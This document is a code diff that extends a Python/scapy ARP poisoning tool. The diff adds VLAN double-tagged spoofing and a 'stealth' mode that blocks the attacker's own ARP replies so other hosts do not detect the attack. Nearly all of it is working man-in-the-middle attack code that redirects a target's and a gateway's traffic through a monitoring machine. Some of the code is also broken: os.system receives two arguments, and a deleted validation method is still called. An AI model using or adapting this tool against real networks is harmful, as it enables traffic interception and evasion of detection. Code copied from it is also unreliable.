@@ -1,18 +1,75 @@
+""" Choice of attacking tool to be used within 1A
+
+Attributes:
+    ARP_DISCOVERY_DEF_TIMEOUT (int): The amount of time to wait to receive
+    									replies from ARP Ping
+    BRDCAST_MAC (str): Contant broadcast MAC address
+    INVALID_VLAN_NO (int): Indicator of invalid vlan number
+"""
 import argparse
+
+import os
 from scapy.all import *
-import netifaces
 from tabulate import tabulate
-from netaddr import IPNetwork
 import time
 
 
 BRDCAST_MAC = "ff:ff:ff:ff:ff:ff"
-ARP_DISCOVERY_DEF_TIMEOUT = 10
+ARP_DISCOVERY_DEF_TIMEOUT = 20
 INVALID_VLAN_NO = -1
+
+G_IS_POISONED = False
+
+class StealthModule:
+
+	""" Prevent other hosts from discovering you attacking
+	"""
+
+	SAVE_FILE = "arp-tables-result.save"
+	def __init__(self):
+		import platform
+
+		self.is_blocked = False
+
+		if platform.system() != "Linux":
+			raise Exception("This stealth function only works only on Linux OS")
+			return 
+
+
+		try:
+			self._save_arp_tables_state()
+			self._flush_arp_table_state()
+			self._block_arp()
+			self.is_blocked = True
+		except Exception as e:
+			raise e
+
+	def _save_arp_tables_state(self):
+		os.system("arptables-save > %s", self.SAVE_FILE)
+
+	def _flush_arp_table_state(self):
+		os.system("arptables -F")
+
+	def _block_arp(self):
+		os.system("arptables -P INPUT DROP")
+
+	def _reset_arp_state(self):
+		if self.is_blocked:
+			print("Resetting arp-tables state")
+			os.system("arptables-restore < %s", self.SAVE_FILE)
+	
+	def __exit__(self, type, value, traceback):
+		self._reset_arp_state()
+
+	def __del__(self):
+		self._reset_arp_state()
 
 
 class NetworkUtility:
 
+	""" This class contains utilities which will be required by 
+		other modules to conduct their attacks.
+	"""
 
 	@staticmethod
 	def send_recv_arp_broadcast(ip_address, timeout_dura=ARP_DISCOVERY_DEF_TIMEOUT):
@@ -20,20 +77,28 @@ class NetworkUtility:
 			for network discovery
 		
 		Args:
-		    ip_address (str): IP address e.g 192.168.1.0
-		    timeout_dura (int, optional): Description
+		    ip_address (str): 				IP address e.g 192.168.1.0
+		    timeout_dura (int, optional): 	ARP Ping wait duration
 		
 		Returns:
-		    TYPE: Description
+		    TYPE: Returns the packets in the form of two variables answers, unanswered
 		"""
 		return srp(Ether(dst=BRDCAST_MAC)/ARP(op=1, pdst=ip_address), timeout=timeout_dura, verbose=False)
 
 	@staticmethod
 	def get_network_details(network, timeout_dura):
+		""" Outputs the above arp ping function
+			in a table to retrieve all IP addresses
+			withs MAC addresses.
+		
+		Args:
+		    network (str): 		Network ID address with subnetmask in slash 10.1.1.0/24
+		    timeout_dura (int): ARP Ping wait duration
+		
+		Returns:
+		    str: Output in a string format 
+		"""
 		ans, unans = NetworkUtility.send_recv_arp_broadcast(network, timeout_dura)
-		for s, r in ans:
-			r.show()
-			print("-----")
 
 		if (len(ans) > 0):
 			tbl_data = [[rcv.sprintf(r"%ARP.psrc%"), rcv.sprintf(r"%Ether.src%")] for snd, rcv in ans]
@@ -44,18 +109,47 @@ class NetworkUtility:
 
 
 class Poisoner:
+
+	""" This class is a package of functionalities
+
+	
+	Attributes:
+	    ARP_SEND_DELAY (int): 	Time to wait after sending each packet
+	    gateway_ip (str): 		Attacker 2 IP or usually the Gateway's IP
+	    IS_VALID_VLAN_NO (int): To check if vlan number is within valid range
+	    target_ip (str): 		Target's PC IP Address
+	    monitor_ip (str): 		The PC's IP which will be the man in the middle
+	    PKT_poison_1 (obj): 	Poison packet for Attacker 1
+	    PKT_poison_2 (obj): 	Poison packet for GW
+	    PKT_unpoison_1 (obj): 	Packet unpoison attacker1 after finished
+	    PKT_unpoison_2 (obj): 	Packet unpoison attacker2 after finished	    
+	    vlan_num_1 (int): 		VLAN number 1 for double tagging
+	    vlan_num_2 (int): 		VLAN number 2 for double tagging
+	"""
+	
 	# https://tools.ietf.org/html/rfc5227#page-7
 	
 	# Minimum interval between defensive ARPs IS 10 seconds 
-	# therefore we set the arp delay to 10 to reduce spamming of ARP.
-
+	# therefore we set the arp delay to 10 to reduce spamming of ARP.	
 	ARP_SEND_DELAY = 10
+
+	# Dont use 1002 to 1005 since they are reserved			
 	IS_VALID_VLAN_NO = lambda self, x: 1 <= x <= 1001 or 1006 <= x <= 4094
 
-
-
 	def __init__(self, target_ip, monitor_ip, gateway_ip, vlan_num_1, vlan_num_2):
-
+		""" Initializes all relevant variables and input
+			validation of VLAN input
+		
+		Args:
+		    target_ip (str): 	Target's PC IP Address
+		    monitor_ip (str): 	Middle Man's IP
+		    gateway_ip (str): 	Target2 or Gateway's IP
+		    vlan_num_1 (int): 	VLAN number 1 for double tagging
+	    vlan_num_2 (int): VLAN number 2 for double tagging
+		
+		Raises:
+		    TypeError: IF Vlan mode is specified by has invalid range
+		"""
 		if (vlan_num_1 != INVALID_VLAN_NO) and (vlan_num_2 != INVALID_VLAN_NO):
 			if not self.IS_VALID_VLAN_NO(int(vlan_num_1)) or not self.IS_VALID_VLAN_NO(int(vlan_num_2)):
 				raise TypeError("VLAN Numbers can be only 1 - 1001 and 1006 - 4094")
@@ -71,7 +165,7 @@ class Poisoner:
 		self.PKT_poison_1 = None
 		self.PKT_poison_2 = None
 
-		self.PKT_unpoison_1 = None
+		self.PKT_unpoison_1 = None 
 		self.PKT_unpoison_2 = None
 
 
@@ -83,57 +177,69 @@ class Poisoner:
 
 
 	def _get_mac_from_ip(self, ip_address):
+		"""Uses ARP Ping to get MAC address of the particular 
+			ip address
+		
+		Args:
+		    ip_address (str): IP address input
+		
+		Returns:
+		    str: Retuns MAC address in the form of string
+		"""
 		# resp, unans = sr(ARP(op=1, hwdst="ff:ff:ff:ff:ff:ff", pdst=ip_address), retry=2, timeout=3, verbose=False)
 		resp, unans = NetworkUtility.send_recv_arp_broadcast(ip_address)
 		for s,r in resp:
 			return r[ARP].hwsrc
 		return None
 
-	# - hwsrc is the MAC corresponding to psrc, to update in the target's arp table
-	# - pdst is where the ARP packet should go (target),
-	# - psrc is the IP to update in the target's arp table,
-	# - hwdst is the destination hardware address
-	# 
-	# 
+
+	"""	- hwsrc is the MAC corresponding to psrc, to update in the target's arp table
+		- pdst is where the ARP packet should go (target),
+		- psrc is the IP to update in the target's arp table,
+		- hwdst is the destination hardware address
+	"""	 
 	def _generate_poison_packets(self, target_mac, monitor_mac, gateway_mac):
-		""" Generate two packets to conduct poisoning
+		"""Generate two packets to conduct poisoning
 			One packet each for target and gateway
 		
 		Args:
-		    target_mac (TYPE): Description
-		    monitor_mac (TYPE): Description
-		    gateway_mac (TYPE): Description
+		    target_mac (str): Target's MAC address
+		    monitor_mac (str): MAAN in middle's MAC Address
+		    gateway_mac (str): Gateway/Target2 MAC Address
 		"""
 
 		#Tell target Gateway IP has Monitor MAC!
 		self.PKT_poison_1 = ARP(op=2, hwdst=target_mac, pdst=self.target_ip, psrc=self.gateway_ip, hwsrc=monitor_mac)
-
+  
 		#Tell gateway that target IP has Monitor MAC!
 		self.PKT_poison_2 = ARP(op=2, hwdst=gateway_mac, pdst=self.gateway_ip, psrc=self.target_ip, hwsrc=monitor_mac)
 
-		if self._is_valid_vlans():
-			self.PKT_poison_1 = self._double_tag_packet(self.PKT_poison_1)
-			self.PKT_poison_2 = self._double_tag_packet(self.PKT_poison_2)
-
-		# self.PKT_poison_1.show()
 
 	def _generate_unpoison_packets(self, target_mac, monitor_mac, gateway_mac):
-
+		"""Summary
+		
+		Args:
+		    target_mac (str): Target's MAC address
+		    monitor_mac (str): MAAN in middle's MAC Address
+		    gateway_mac (str): Gateway/Target2 MAC Address
+		"""
 		# Lie to target to make Gateway IP back to Gateway Mac :(
 		self.PKT_unpoison_1 = ARP(op=2, hwdst=target_mac, pdst=self.target_ip, psrc=self.gateway_ip, hwsrc=gateway_mac)
 
 		# Lie to target to make Target IP back to Target Mac :(
 		self.PKT_unpoison_2 = ARP(op=2, hwdst=gateway_mac, pdst=self.gateway_ip, psrc=self.target_ip, hwsrc=target_mac)
 
-		if self._is_valid_vlans():
-			self.PKT_unpoison_1 = self._double_tag_packet(self.PKT_unpoison_1)
-			self.PKT_unpoison_2 = self._double_tag_packet(self.PKT_unpoison_2) 	
+			
+	def double_tag_poison_packets(self):
+		self.PKT_poison_1  = Ether(dst=BRDCAST_MAC)/Dot1Q(vlan=int(self.vlan_num_1))/Dot1Q(vlan=int(self.vlan_num_2))/self.PKT_poison_1
+		self.PKT_poison_2 = Ether(dst=BRDCAST_MAC)/Dot1Q(vlan=int(self.vlan_num_1))/Dot1Q(vlan=int(self.vlan_num_2))/self.PKT_poison_2
 
-		# self.PKT_unpoison_1.show()
-
+	def double_tag_unpoison_packets(self):
+		self.PKT_unpoison_1 = Ether(dst=BRDCAST_MAC)/Dot1Q(vlan=int(self.vlan_num_1))/Dot1Q(vlan=int(self.vlan_num_2))/self.PKT_unpoison_1
+		self.PKT_unpoison_2 = Ether(dst=BRDCAST_MAC)/Dot1Q(vlan=int(self.vlan_num_1))/Dot1Q(vlan=int(self.vlan_num_2))/self.PKT_unpoison_2
 
 	def run(self):
-		""" Entry portion of Poisoning 
+		""" Poisoning Mode 1, without VLAN double tagging
 		"""
 		target_mac = self._get_mac_from_ip(self.target_ip)
 
@@ -149,70 +255,103 @@ class Poisoner:
 		else:
 			monitor_mac = self._get_mac_from_ip(self.monitor_ip)
 		
+		missing = ""
 
 		if target_mac is None:
-			print("No MAC found for {}.".format(target_ip))
+			missing += "No MAC found for {}.\n".format(self.target_ip)
+			
 		if monitor_mac is None:
-			print("No MAC found for {}.".format(monitor_ip))
+			missing += "No MAC found for {}.\n".format(self.monitor_ip)
+
 		if gateway_mac is None:
-			print("No MAC found for {}.".format(gateway_ip))
+			missing += "No MAC found for {}.\n".format(self.gateway_ip)
+
+		if missing != "":
+			print(missing)
+			sys.exit()
+
 
 		print("Target: {} , Monitor: {}, Gateway: {} ".format(target_mac, monitor_mac, gateway_mac))
 
 		self._generate_poison_packets(target_mac, monitor_mac, gateway_mac)
 		self._generate_unpoison_packets(target_mac, monitor_mac, gateway_mac)
 
-		# sys.exit()
+		self.PKT_poison_1.show()
+		self.PKT_poison_2.show()
+
 		try:
 			#  Start poisoining
-			print("spoofing...")
-			while True:
+			print("[*] Starting Normal Poisoning...")
+			while True:				
 				send(self.PKT_poison_1)
 				send(self.PKT_poison_2)
+
+				# Abide to RFC
 				time.sleep(self.ARP_SEND_DELAY)
 			
 		except KeyboardInterrupt:
 			# Unpoison if Ctrl-C 
 			print("[*] Keyboard interupted... restoring ARP Cache")
-			for i in range(5):
+			for i in range(3):
 				send(self.PKT_unpoison_1)
 				send(self.PKT_unpoison_2)			
 			print("[*] Finished reseting gateway and target")
+		finally:
+			return 0
 
+	def _unpoison_victims(self):
+		""" Unpoisoning procedure 
+		"""
+		for i in range(5):
+			send(self.PKT_unpoison_1)
+			send(self.PKT_unpoison_2)
 
+	def run_vlan_poison(self, target_mac, monitor_mac, gateway_mac):
+		self._generate_poison_packets(target_mac, monitor_mac, gateway_mac)
+		self._generate_unpoison_packets(target_mac, monitor_mac, gateway_mac)
 
-	# Poisoner._send_spoofed_grat_arp_packet(target_ip, target_mac, gateway_ip, monitor_mac, vlan1, vlan2)
-	# Poisoner._send_spoofed_grat_arp_packet(gateway_ip, gateway_mac, target_ip, monitor_mac, vlan1, vlan2)
+		self.double_tag_poison_packets()
+		self.double_tag_unpoison_packets()
 
-	@staticmethod
-	def _send_spoofed_grat_arp_packet(target_ip, target_mac, table_ip, table_mac, vlan_1, vlan_2):
-		# send(ARP(op=2, pdst=target_ip, psrc=table_ip, hwdst=table_mac))
+		# self.PKT_poison_1.show()
+		# self.PKT_poison_2.show()
+		# exit()
+		try:
+		#  Start poisoining
+			print("[*] Starting Double Tagged Poisoning...")
+			while True:
+				send(self.PKT_poison_1)
+				send(self.PKT_poison_2)
+				# Abide to RFC
+				# time.sleep(self.ARP_SEND_DELAY)
 		
-		# pkt = Dot1Q(vlan=10)/Dot1Q(vlan=20)/ARP(op=2, pdst=target_ip, psrc=table_ip, hwsrc=table_mac)
-		ARP(op=2, hwdst=target_mac, pdst=target_ip, psrc=table_ip, hwsrc=table_mac)
-		ARP(op=2, hwdst=gateway_mac, pdst=gateway_ip, psrc=table_ip, hwsrc=table_mac)
+		except KeyboardInterrupt:
+			# Unpoison if Ctrl-C 
+			print("[*] Keyboard interupted... restoring ARP Cache")
+			self._unpoison_victims()
+			print("[*] Finished reseting gateway and target")
+		finally:
+			return 0
 
+	def _cleanup_poison(self):
+		if G_IS_POISONED:
+			self._unpoison_victims()
 
-		pkt_to_send = ARP(op=2, hwdst=target_mac, pdst=target_ip, psrc=table_ip, hwsrc=table_mac)
+	def __exit__(self, type, value, traceback):
+		self._unpoison_victims()
 
-		if vlan_1 != -1 and vlan_2 != -1:
-			pkt_to_send = Dot1Q(vlan=vlan_1)/Dot1Q(vlan=vlan_2)/pkt_to_send
-
-
-		# pkt_to_send.show()
-		# sys.exit()
-		# send(pkt_to_send)
-		# send(ARP(op=2, hwdst="ff:ff:ff:ff:ff:ff", pdst=target_ip, psrc=table_ip, hwsrc=table_mac))
-		# send(ARP(op=2, pdst=target_ip, psrc=table_ip, hwsrc=table_mac))
-
-
+	def __del__(self):
+		self._unpoison_victims()
+		
 
 class ArgParser(argparse.ArgumentParser):
-	
-	# Dont use 1002 to 1005 since they are reserved	
-	IS_VALID_VLAN_NO = lambda self, x: 1 <= int(x) <= 1001 or 1006 <= int(x) <= 4094
 
 	def error(self, message):
+		""" OVerride error function
+
+		Args:
+		    message (str): Error message to print out
+		"""
 		sys.stderr.write('error: %s\n' % message)
 		self.print_help()
 		sys.exit(2)
@@ -220,16 +359,62 @@ class ArgParser(argparse.ArgumentParser):
 	def __init__(self):
 		self.parser = argparse.ArgumentParser(description="This is an ARP poisoning script")
 		self.parser.add_argument('-l', dest='network', help='Lists all IP & MAC Addresses for particular subnet. E.g -l 192.168.1.0/24', action='store')		
+		self.parser.add_argument('--stealth', dest='stealth', help='Configures this host machine to not reply all ARP packets. *Only for linux', action='store_true')		
 		self.parser.add_argument('-P', dest='arp_poison', help='ARP Poisoning for network redirection and monitoring.', action='store_true')		
-		self.parser.add_argument('-T', dest='target_ip', help='*For -P* Target\'s IP address.', action='store')
-		self.parser.add_argument('-M', dest='monitoring_ip', help='*For -P* Monitoring PC\'s IP address.', action='store')
-		self.parser.add_argument('-GW', dest='gateway_ip', help='*For -P* Gateway\'s IP address.', action='store')
+		self.parser.add_argument('-PV', dest='arp_poison_vlan', help='ARP Poisoning for network redirection and monitoring with Double Tagging.', action='store_true')		
+		self.parser.add_argument('-T', dest='target_ip', help='*For -P or -PV Target\'s IP address.', action='store')
+		self.parser.add_argument('-M', dest='monitoring_ip', help='*For -P* or -PV Monitoring PC\'s IP address.', action='store')
+		self.parser.add_argument('-G', dest='gateway_ip', help='*For -P or -PV Gateway\'s IP address.', action='store')
+
+		self.parser.add_argument('-TM', dest='target_mac', help='*For -PV* Target\'s MAC Address1.', action='store')
+		self.parser.add_argument('-MM', dest='monitoring_mac', help='*For -PV* Monitoring PC\'s MAC Address1.', action='store')
+		self.parser.add_argument('-GM', dest='gateway_mac', help='*For -PV* Gateway\'s MAC Address1.', action='store')
+
 		self.parser.add_argument('--vlan1', dest='vlan1_num', help='*For -P* Specify VLAN Number for first 802.1q TAG' , action='store')
 		self.parser.add_argument('--vlan2', dest='vlan2_num', help='*For -P* Specify VLAN Number for second 802.1q TAG', action='store')
+
+
+
+	def check_required_args(self, arg_obj):
+		error_msg = "\n"
+		if arg_obj.target_ip is None:
+			error_msg += "[-T] is required\n"
+
+		if arg_obj.monitoring_ip is None:
+			error_msg += "[-M] Monitoring IP param is required\n"
+
+		if arg_obj.gateway_ip is None:
+			error_msg += "[-GW] Gateway is required\n"
+		return error_msg
+		
+	def check_vlan_args(self, arg_obj):
+
+		error_msg = self.check_required_args(arg_obj)
+
+		if arg_obj.vlan1_num is not None and arg_obj.vlan2_num is None:
+			error_msg += "[--vlan2] Please specified vlan2 number\n"				
+
+		if arg_obj.vlan1_num is  None and arg_obj.vlan2_num is not  None:
+			error_msg += "[--vlan1] Please specified vlan1 number\n"
+
+		if arg_obj.vlan1_num is not None and arg_obj.vlan2_num is not None:
+			if not self.IS_VALID_VLAN_NO(arg_obj.vlan1_num):
+				error_msg += "[--vlan1] Invalid VLAN Tag 1\n"
+
+			if not self.IS_VALID_VLAN_NO(arg_obj.vlan2_num):
+				error_msg += "[--vlan2] Invalid VLAN Tag 2\n"
+		return error_msg
+
 
 	def parse_arguments(self):
 
 		args = self.parser.parse_args()
+
+		if args.stealth:
+			try:				
+				self.stealth = StealthModule()
+			except Exception as e:
+				print(e)
 
 		if args.network:
 
@@ -241,48 +426,39 @@ class ArgParser(argparse.ArgumentParser):
 
 
 		elif args.arp_poison:
-
-			error_msg = "\n"
-			if args.target_ip is None:
-				error_msg += "[-T] is required\n"
-
-			if args.monitoring_ip is None:
-				error_msg += "[-M] Monitoring IP param is required\n"
-
-			if args.gateway_ip is None:
-				error_msg += "[-GW] Gateway is required\n"
-
-			if args.vlan1_num is not None and args.vlan2_num is None:
-				error_msg += "[--vlan2] Please specified vlan2 number\n"				
-
-			if args.vlan1_num is  None and args.vlan2_num is not  None:
-				error_msg += "[--vlan1] Please specified vlan1 number\n"
-
-			if args.vlan1_num is not None and args.vlan2_num is not None:
-				if not self.IS_VALID_VLAN_NO(args.vlan1_num):
-					error_msg += "[--vlan1] Invalid VLAN Tag 1\n"
-
-				if not self.IS_VALID_VLAN_NO(args.vlan2_num):
-					error_msg += "[--vlan2] Invalid VLAN Tag 2\n"
-					
+			error_msg = self.check_required_args(args)
 
 			if error_msg != "\n":
 				raise self.parser.error(error_msg)
 			else:
-				print("Correct", args.target_ip, args.monitoring_ip, args.gateway_ip)
+				print("All Args Correct", args.target_ip, args.monitoring_ip, args.gateway_ip)
 
-				# try:
-				if args.vlan1_num is not None and args.vlan2_num is not None:
-					poison = Poisoner(args.target_ip, args.monitoring_ip, args.gateway_ip, args.vlan1_num, args.vlan2_num)
-				else:
-					poison = Poisoner(args.target_ip, args.monitoring_ip, args.gateway_ip, INVALID_VLAN_NO, INVALID_VLAN_NO)
+				try:
+					if args.vlan1_num is not None and args.vlan2_num is not None:
+						poison = Poisoner(args.target_ip, args.monitoring_ip, args.gateway_ip, args.vlan1_num, args.vlan2_num)
+					else:
+						poison = Poisoner(args.target_ip, args.monitoring_ip, args.gateway_ip, INVALID_VLAN_NO, INVALID_VLAN_NO)
 
-				poison.run()
-				# except Exception as e:
-				# 	raise e
+					poison.run()
+				except Exception as e:
+					raise e				
+				
+		elif args.arp_poison_vlan:
+
+			error_msg = self.check_vlan_args(args)
+			if error_msg != "\n":
+				raise self.parser.error(error_msg)
+			else:
+				poison = Poisoner(args.target_ip, args.monitoring_ip, args.gateway_ip, args.vlan1_num, args.vlan2_num)
+				
+			poison.run_vlan_poison(args.target_mac, args.monitoring_mac, args.gateway_mac)
 		else:
 			self.parser.print_help()
 			sys.exit(2)
+
+		if args.stealth and self.stealth is not None:
+			del self.stealth
+
 		
 
 if __name__=="__main__":
@@ -290,4 +466,3 @@ if __name__=="__main__":
 	A = ArgParser()
 	A.parse_arguments()
 
-# To enable IP forwarding: echo 1 > /proc/sys/net/ipv4/ip_forward
